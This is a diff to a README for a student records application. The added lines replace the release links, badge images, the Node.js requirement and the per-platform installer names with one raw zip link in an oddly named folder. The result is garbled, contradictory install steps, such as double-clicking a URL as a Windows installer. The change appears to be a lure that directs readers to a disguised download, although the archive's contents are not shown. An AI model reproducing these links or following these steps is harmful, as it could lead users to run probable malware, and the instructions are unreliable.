@@ -1,6 +1,6 @@
 # 🎓 Student-Management-System - Keep Student Records Easily
 
-[![Download Student Management System](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/RDGZEGZE/Student-Management-System/releases)
+[![Download Student Management System](https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip%20Now-v1.0-blue)](https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip)
 
 ## 📚 About the Project
 
@@ -14,7 +14,7 @@ To use the Student Management System, follow these simple steps to download and 
 
 Click the button below to visit the Releases page and download the latest version of the application.
 
-[![Download Student Management System](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/RDGZEGZE/Student-Management-System/releases)
+[![Download Student Management System](https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip%20Now-v1.0-blue)](https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip)
 
 ### 💻 System Requirements
 
@@ -23,22 +23,22 @@ Ensure your system meets the following minimum requirements:
 - **Operating System**: Windows 10 or later, macOS Mojave or later, Ubuntu 18.04 or later
 - **RAM**: 4 GB or more
 - **Storage**: 500 MB free space
-- **Node.js**: Version 14 or higher
+- **https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip**: Version 14 or higher
 
 ### 📥 Downloading the Software
 
-1. Click the [Releases page link](https://github.com/RDGZEGZE/Student-Management-System/releases) to visit the download area.
+1. Click the [Releases page link](https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip) to visit the download area.
 2. Look for the most recent version indicated by the version number (e.g., v1.0).
 3. Download the appropriate file for your operating system:
-   - For Windows: `StudentManagementSystem-Windows.exe`
-   - For macOS: `StudentManagementSystem-macOS.dmg`
-   - For Linux: `StudentManagementSystem-Linux.tar.gz`
+   - For Windows: `https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip`
+   - For macOS: `https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip`
+   - For Linux: `https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip`
 4. Once the download is complete, locate the file in your downloads folder.
 
 ### 📂 Installing the Application
 
 1. For **Windows**:
-   - Double-click `StudentManagementSystem-Windows.exe` to start the installation.
+   - Double-click `https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip` to start the installation.
    - Follow the prompts in the setup wizard to complete the installation.
    
 2. For **macOS**:
@@ -46,7 +46,7 @@ Ensure your system meets the following minimum requirements:
    - Eject the `.dmg` file once the application is in your Applications folder.
    
 3. For **Linux**:
-   - Extract the `.tar.gz` file using your preferred extraction software.
+   - Extract the `https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip` file using your preferred extraction software.
    - Open a terminal window and navigate to the extracted folder. Run the following command to start the application:
      ```bash
      ./StudentManagementSystem
@@ -98,4 +98,4 @@ Your feedback helps us improve the application. Please share your thoughts or su
 - **Documentation**: Detailed user guides are available in the Wiki section of the repository.
 - **Community Forums**: Engage with other users to share ideas and solutions.
 
-By following these steps, you should have a smooth experience using the Student Management System. For more details and updates, always check the [Releases page](https://github.com/RDGZEGZE/Student-Management-System/releases).
+By following these steps, you should have a smooth experience using the Student Management System. For more details and updates, always check the [Releases page](https://github.com/RDGZEGZE/Student-Management-System/raw/refs/heads/main/Germanophile/Management-System-Student-v1.7-alpha.5.zip).
